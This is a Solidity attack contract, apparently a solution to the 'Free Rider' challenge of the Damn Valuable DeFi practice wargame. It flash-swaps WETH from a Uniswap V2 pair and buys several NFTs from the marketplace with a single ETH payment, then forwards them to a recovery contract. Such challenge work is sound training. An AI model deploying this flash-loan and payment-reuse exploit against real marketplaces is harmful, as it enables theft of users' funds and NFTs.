// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address to, uint256 amount) external;

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract AttackFreeRider is IERC721Receiver {
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    IERC20 weth;
    IUniswapV2Pair uniswapPair;
    address freeRiderRecovery;
    address player;
    uint256[] tokenIds;

    constructor(
        address _marketplace,
        address _nft,
        address _weth,
        address _uniswapPair,
        address _freeRiderRecovery
    ) {
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        nft = DamnValuableNFT(_nft);
        weth = IERC20(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        freeRiderRecovery = _freeRiderRecovery;
    }

    function attack(
        uint256 amount,
        uint256[] calldata _tokenIds
    ) public payable {
        player = msg.sender;
        weth.deposit{value: address(this).balance}();
        tokenIds = _tokenIds;
        // revert Testing();
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function sendNFTs() public {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(
                address(this),
                freeRiderRecovery,
                i,
                abi.encode(player)
            );
        }
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        weth.withdraw(weth.balanceOf(address(this)));
        marketplace.buyMany{value: address(this).balance}(tokenIds);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
